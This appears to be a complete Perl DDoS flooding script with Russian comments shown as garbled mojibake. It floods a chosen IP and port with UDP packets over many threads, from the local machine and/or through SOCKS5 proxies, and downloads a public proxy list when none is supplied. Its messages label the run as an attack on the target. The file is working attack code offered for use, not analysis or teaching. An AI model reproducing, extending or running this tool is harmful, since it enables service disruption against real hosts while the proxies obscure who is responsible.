#!/usr/bin/perl

use strict;
use warnings;
use threads;
use threads::shared;
use IO::Socket;
use IO::Socket::INET;
use IO::Socket::Socks;
use LWP::Simple;
use Socket;
use Time::HiRes qw(gettimeofday tv_interval sleep);
use Sys::Info;

# –ü–æ–ª—É—á–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞
my $info = Sys::Info->new;
my $cpu = $info->device('CPU');
my $max_threads = $cpu->count || 4;

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤
if (@ARGV < 7) {
    die "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: $0 <IP> <–ø–æ—Ä—Ç> <—Ä–∞–∑–º–µ—Ä> <–≤—Ä–µ–º—è> <udp/tcp/http> <–æ—Å–Ω–æ–≤–Ω–æ–π/–ø—Ä–æ–∫—Å–∏/all> <—Ñ–∞–π–ª_–ø—Ä–æ–∫—Å–∏> [–ø–æ—Ç–æ–∫–∏]\n";
}

# –ü–æ–ª—É—á–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
my ($ip, $port, $size, $time, $protocol, $attack_type, $proxy_file, $threads) = @ARGV;

# –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ—Å—Ç—å –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
die "–û—à–∏–±–∫–∞: –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π IP: $ip\n" unless $ip =~ /^(\d{1,3}\.){3}\d{1,3}$/;
die "–û—à–∏–±–∫–∞: –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –ø–æ—Ä—Ç: $port\n" unless $port =~ /^\d+$/ && $port > 0 && $port <= 65535;
die "–û—à–∏–±–∫–∞: –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ä–∞–∑–º–µ—Ä –ø–∞–∫–µ—Ç–∞: $size\n" unless $size =~ /^\d+$/ && $size >= 64 && $size <= 65507;
die "–û—à–∏–±–∫–∞: –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –≤—Ä–µ–º—è: $time\n" unless $time =~ /^\d+$/ && $time > 0;
die "–û—à–∏–±–∫–∞: –£–∫–∞–∂–∏—Ç–µ –ø—Ä–æ—Ç–æ–∫–æ–ª (udp/tcp/http)\n" unless $protocol =~ /^(udp|tcp|http)$/i;
die "–û—à–∏–±–∫–∞: –£–∫–∞–∂–∏—Ç–µ —Ç–∏–ø –∞—Ç–∞–∫–∏ (–æ—Å–Ω–æ–≤–Ω–æ–π/–ø—Ä–æ–∫—Å–∏/all)\n" unless $attack_type =~ /^(–æ—Å–Ω–æ–≤–Ω–æ–π|–ø—Ä–æ–∫—Å–∏|all)$/i;

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ—Ç–æ–∫–æ–≤
if (defined $threads) {
    die "–û—à–∏–±–∫–∞: –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫–æ–≤\n" unless $threads =~ /^\d+$/ && $threads > 0;
    if ($threads > $max_threads) {
        print "‚ö†Ô∏è  –£–∫–∞–∑–∞–Ω–æ $threads –ø–æ—Ç–æ–∫–æ–≤, –Ω–æ –¥–æ—Å—Ç—É–ø–Ω–æ $max_threads. –ò—Å–ø–æ–ª—å–∑—É–µ–º $max_threads.\n";
        $threads = $max_threads;
    }
} else {
    print "üîπ –ü–æ—Ç–æ–∫–∏ –Ω–µ —É–∫–∞–∑–∞–Ω—ã. –ò—Å–ø–æ–ª—å–∑—É–µ–º –º–∞–∫—Å–∏–º—É–º: $max_threads\n";
    $threads = $max_threads;
}

# –ó–∞–≥—Ä—É–∂–∞–µ–º –ø—Ä–æ–∫—Å–∏
my @proxies;
if ($attack_type =~ /^(–ø—Ä–æ–∫—Å–∏|all)$/i) {
    if (-e $proxy_file) {
        open my $fh, '<', $proxy_file or die "–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª –ø—Ä–æ–∫—Å–∏: $proxy_file\n";
        @proxies = <$fh>;
        chomp(@proxies);
        close $fh;
    }
    # –ï—Å–ª–∏ —Ñ–∞–π–ª –ø—É—Å—Ç, –∑–∞–≥—Ä—É–∂–∞–µ–º –ø—Ä–æ–∫—Å–∏ –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞
    if (!@proxies) {
        print "‚è≥ –ó–∞–≥—Ä—É–∂–∞–µ–º —Å–≤–µ–∂–∏–µ –ø—Ä–æ–∫—Å–∏...\n";
        my $proxy_data = get("https://www.proxy-list.download/api/v1/get?type=socks5") || "";
        @proxies = split /\n/, $proxy_data;
        die "–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø—Ä–æ–∫—Å–∏ –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞!\n" unless @proxies;
        print "‚úÖ –ó–∞–≥—Ä—É–∂–µ–Ω–æ " . scalar(@proxies) . " –ø—Ä–æ–∫—Å–∏.\n";
    }
}

# –ì–ª–æ–±–∞–ª—å–Ω—ã–π —Å—á—ë—Ç—á–∏–∫ –ø–∞–∫–µ—Ç–æ–≤
my $total_packets :shared = 0;

# –í—ã–≤–æ–¥ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
print "\n=== [ –ù–ê–ß–ê–õ–û –ê–¢–ê–ö–ò ] ===\n";
print " –¶–µ–ª—å: $ip:$port\n";
print " –ü—Ä–æ—Ç–æ–∫–æ–ª: " . uc($protocol) . "\n";
print " –†–∞–∑–º–µ—Ä –ø–∞–∫–µ—Ç–∞: $size –±–∞–π—Ç\n";
print " –í—Ä–µ–º—è: $time —Å–µ–∫—É–Ω–¥\n";
print " –ü–æ—Ç–æ–∫–∏: $threads\n";
print " –¢–∏–ø –∞—Ç–∞–∫–∏: " . ($attack_type eq "–æ—Å–Ω–æ–≤–Ω–æ–π" ? "–° –æ—Å–Ω–æ–≤–Ω–æ–≥–æ IP" : $attack_type eq "–ø—Ä–æ–∫—Å–∏" ? "–ß–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏ ($proxy_file)" : "–° –æ—Å–Ω–æ–≤–Ω–æ–≥–æ IP + –ü—Ä–æ–∫—Å–∏ ($proxy_file)") . "\n\n";

# –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –ø–∞–∫–µ—Ç–∞
my $packet = "X" x $size;
my $endtime = time() + $time;

# –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–æ–≤
my @threads;

sub attack_machine {
    socket(my $socket, PF_INET, SOCK_DGRAM, 0) or die "–û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Å–æ–∫–µ—Ç: $!\n";
    setsockopt($socket, SOL_SOCKET, SO_SNDBUF, 65507);
    my $sockaddr = pack_sockaddr_in($port, inet_aton($ip));

    while (time() <= $endtime) {
        send($socket, $packet, 0, $sockaddr);
        { lock($total_packets); $total_packets++; }
        print "üì§ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: $total_packets –ø–∞–∫–µ—Ç–æ–≤ ($ip:$port)\n";
    }
}

sub attack_proxy {
    while (time() <= $endtime) {
        my $proxy = $proxies[rand @proxies];
        my ($proxy_ip, $proxy_port) = split /:/, $proxy;
        my $socket = IO::Socket::Socks->new(
            ProxyAddr => $proxy_ip,
            ProxyPort => $proxy_port,
            ConnectAddr => $ip,
            ConnectPort => $port,
            SocksVersion => 5,
            Timeout => 5
        );
        if ($socket) {
            print $socket $packet;
            close($socket);
            { lock($total_packets); $total_packets++; }
            print "üì§ –ü—Ä–æ–∫—Å–∏ $proxy –æ—Ç–ø—Ä–∞–≤–∏–ª –ø–∞–∫–µ—Ç.\n";
        }
    }
}

for my $i (1 .. $threads) {
    if ($attack_type eq "–æ—Å–Ω–æ–≤–Ω–æ–π" || $attack_type eq "all") {
        push @threads, threads->create(\&attack_machine);
    }
    if ($attack_type eq "–ø—Ä–æ–∫—Å–∏" || $attack_type eq "all") {
        push @threads, threads->create(\&attack_proxy);
    }
}

$_->join() for @threads;

print "\n=== [ –ê–¢–ê–ö–ê –ó–ê–í–ï–†–®–ï–ù–ê ] ===\n";
print "–í—Å–µ–≥–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ø–∞–∫–µ—Ç–æ–≤: $total_packets ($ip:$port)\n";
